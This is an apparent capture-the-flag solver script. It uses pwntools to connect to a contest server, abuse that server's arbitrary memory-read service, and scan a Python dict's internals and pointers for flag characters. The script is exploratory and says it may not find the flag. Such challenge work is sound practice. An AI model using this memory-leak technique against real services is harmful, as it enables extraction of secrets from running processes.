from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'

# Connect via SSL as instructed
io = remote(HOST, PORT, ssl=True)

# receive the banner lines
intro = io.recvline_contains(b'flag is over at').decode()
print(intro.strip())

# consume the second banner line about python version
banner2 = io.recvline().decode()
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
if not m:
    print('could not find base address')
    exit(1)

base = int(m.group(1), 16)
print(f'base = {hex(base)}')

# helper to read 8 bytes from address using the service
def read8(addr):
    s = hex(addr)
    io.sendline(s.encode())
    line = io.recvline(timeout=3).decode().strip()
    
    if 'illegal memory address' in line:
        return None
        
    try:
        _, data = line.split(': ')
        data = data.strip()
        raw = bytes.fromhex(data)
        return raw
    except:
        return None

reads_used = 0
max_reads = 48  # Leave a couple reads as buffer

print("Scanning dict object structure...")

# Scan the dict object itself first to understand its layout
dict_data = []
for off in range(0, 0x50, 8):  # First 10 qwords of dict object
    if reads_used >= max_reads:
        break
    addr = base + off
    data = read8(addr)
    reads_used += 1
    
    if data:
        val = u64(data)
        dict_data.append((addr, val, data))
        print(f'Dict+{off:#x}: {data.hex()} -> ptr {val:#x}')

# Look for dk_entries pointer (usually 3rd or 4th qword in dict object)
# and scan around potential string pointers
candidates = []
for addr, val, data in dict_data:
    # Look for heap pointers that could point to dict entries or strings
    if 0x400000 < val < 0x800000000000:
        candidates.append(val)

print(f"\nFound {len(candidates)} potential pointers, scanning...")

flag_chars = {}  # Will store index -> character mapping

for i, cand in enumerate(candidates):
    if reads_used >= max_reads - 5:
        break
    
    print(f"Scanning candidate {i+1}: {cand:#x}")
    
    # Scan around this candidate looking for string objects or dict entries
    for j in range(-1, 8):  # Small scan around candidate
        if reads_used >= max_reads - 2:
            break
            
        scan_addr = cand + j*8
        data = read8(scan_addr)
        reads_used += 1
        
        if not data:
            continue
            
        # Look for printable characters that could be flag parts
        ascii_chars = []
        for byte in data:
            if 32 <= byte <= 126:  # Printable ASCII
                ascii_chars.append(chr(byte))
            elif byte == 0:
                break  # Null terminator
                
        if ascii_chars:
            text = ''.join(ascii_chars)
            print(f"  {scan_addr:#x}: Found text '{text}'")
            
            # Check if this looks like flag content
            if any(c in text for c in 'flag{}0123456789abcdef_-'):
                print(f"    *** Potential flag fragment: '{text}'")
                
        # Also try reading the value as a pointer to see if it points to more data
        val = u64(data)
        if 0x400000 < val < 0x800000000000 and reads_used < max_reads - 1:
            ptr_data = read8(val)
            reads_used += 1
            if ptr_data:
                ptr_chars = []
                for byte in ptr_data:
                    if 32 <= byte <= 126:
                        ptr_chars.append(chr(byte))
                    elif byte == 0:
                        break
                        
                if ptr_chars:
                    ptr_text = ''.join(ptr_chars)
                    print(f"    -> {val:#x}: '{ptr_text}'")
                    
                    # This could be individual flag characters
                    if len(ptr_text) == 1 and ptr_text in 'abcdefghijklmnopqrstuvwxyz0123456789{}_-':
                        print(f"      *** Single character found: '{ptr_text}'")

print(f"\nUsed {reads_used}/{max_reads} reads")
print("Scan complete. If no clear flag was found, the challenge may require")
print("more targeted scanning or understanding of the specific Python dict layout.")

io.close()